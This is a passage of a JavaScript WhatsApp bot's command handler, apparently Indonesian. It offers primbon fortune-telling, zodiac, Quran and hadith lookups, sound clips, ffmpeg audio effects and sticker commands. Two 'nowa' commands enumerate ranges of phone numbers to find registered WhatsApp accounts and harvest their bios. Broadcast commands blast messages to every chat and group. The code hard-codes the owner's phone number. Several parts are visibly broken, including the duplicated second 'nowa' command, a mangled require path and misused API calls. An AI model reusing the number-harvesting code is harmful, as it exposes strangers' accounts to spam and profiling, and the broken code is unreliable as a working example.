if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} rikibos, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 if (isBan) throw sticBanLu(from)
 sticWait(from)
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await rikibos.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break
//=================================================//
case 'bcgc': case 'bcgroup': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await rikibos.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Sosmed',
url: 'https://www.instagram.com/ryarllh_01/'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6287741097274'
}
}, {
quickReplyButton: {
displayText: 'Status',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Instagram',
id: 'instagram'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
rikibos.send5ButImg(i, txt, rikibos.user.name, global.thumb, btn)
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'nowa': {
if (isBan) return reply(mess.ban)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await rikibos.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await rikibos.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'bc': case 'broadcast': case 'bcall': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Sosmed',
url: 'https://www.instagram.com/ryarllh_01/'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6287741097274'
}
}, {
quickReplyButton: {
displayText: 'Status',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Instagram',
id: 'instagram'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
rikibos.send5ButImg(yoi, txt, rikibos.user.name, global.thumb, btn)
}
reply('Sukses Broadcast')
}
break
//=================================================//
case 'cerpen':{
if (isBan) throw sticBanLu(from)
if (!q) return reply(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
 
cerpen anak
cerpen bahasa daerah
cerpen bahasa inggrisKak
cerpen bahasa jawa
cerpen bahasa sunda
cerpen budaya
cerpen cinta
cerpen cinta islami
cerpen cinta pertama
cerpen cinta romantis
cerpen cinta sedih
cerpen cinta segitiga
cerpen cinta sejati
cerpen galau
cerpen gokil
cerpen inspiratif
cerpen jepang
cerpen kehidupan
cerpen keluarga
cerpen kisah nyata
cerpen korea
cerpen kristen
cerpen liburan
cerpen lingkungan
cerpen lucu
cerpen malaysia
cerpen mengharukan
cerpen misteri
cerpen motivasi
cerpen nasihat
cerpen nasionalisme
cerpen olahraga
cerpen patah hati
cerpen penantian
cerpen pendidikan
cerpen pengalaman pribadi
cerpen pengorbanan
cerpen penyesalan
cerpen perjuangan
cerpen perpisahan
cerpen persahabatan
cerpen petualangan
cerpen ramadhan
cerpen remaja
cerpen renungan
cerpen rindu
cerpen rohani
cerpen romantis
cerpen sastra
cerpen sedih
cerpen sejarah
cerpen slice of life
cerpen terjemahan
cerpen thriller

`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await rikibos.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
rikibos.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================// 
case 'umma': case 'ummadl': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
let { umma } = require('./rikilah/lib) scraper')
let anu = await umma(isUrl(text)[0])
if (anu.type == 'video') {
let buttons = [
{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.author.profilePic },
caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
footer: rikibos.user.name,
buttons,
headerType: 4
}
rikibos.sendMessage(m.chat, buttonMessage, { quoted: rik })
} else if (anu.type == 'image') {
anu.media.map(async (url) => {
rikibos.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: rik })
})
}
}
break
//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./rikilah/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: rik })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
rikibos.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:rik}).catch ((err) => reply(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)
if (args[0] === 'pdf') {
rikibos.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:rik})
} else if (args[0] === 'docx') {
rikibos.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:rik})
} else if (args[0] === 'pptx') {
rikibos.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:rik})
} else if (args[0] === 'xlsx') {
rikibos.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:rik})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'alquran': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
rikibos.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : rik })
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
rikibos.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : rik })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//=================================================//
case 'setcmd': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
rikibos.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
//=================================================//
case 'addmsg': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'getmsg': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
rikibos.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'listmsg': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let msgs = JSON.parse(fs.readFileSync('./rikilah/dbnye/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//

case 'public': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
rikibos.public = true
reply('Sukses Ubah Ke Publik')
}
break
//=================================================//
case 'self': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
rikibos.public = false
reply('Sukses Ubah Menjadi Diri Sendiri')
}
break
//=================================================//
case 'nowa':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
                var teks = body.slice(6)
                if (!teks) return m.reply("lah?")
                var numberPattern = /\d+/g;
                var nomer = teks.match(numberPattern)
                var random_length = teks.length - nomer[0].length;
                if (random_length == 1) {
                    var random = 10
                } else if (random_length == 2) {
                    var random = 100
                } else if (random_length == 3) {
                    var random = 1000
                } else if (random_length == 4) {
                    var random = 10000
                }
                console.log(random)
                var nomerny = `List Nomer\n`
                for (let i = 0; i < random; i++) {
                    var nu = ['1','2','3','4','5','6','7','8','9']
                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
                    if (random_length == 1) {
                        var rndm = `${dom1}`
                        var gdaftar = []
                    } else if (random_length == 2) {
                        rndm = `${dom1}${dom2}`
                    } else if (random_length == 3) {
                        rndm = `${dom1}${dom2}${dom3}`
                    } else if (random_length == 4) {
                        rndm = `${dom1}${dom2}${dom3}${dom4}`
                    }
                    var anu = await rikibos.getName(`${nomer[0]}${i}@s.whatsapp.net`);
                    var bionye = await rikibos.setStatus(`${nomer[0]}${i}@s.whatsapp.net`);
                    var anuu = anu ? anu : false;
                    try {
                        if (nomerny.includes(m.quoted.sender("@")[0])) {
                            //console.log(i)
                        } else {
                            nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
                        }
                    } catch {
                        console.log(i)
                    }
                }
                m.reply(nomerny)
                console.log("Done dump")
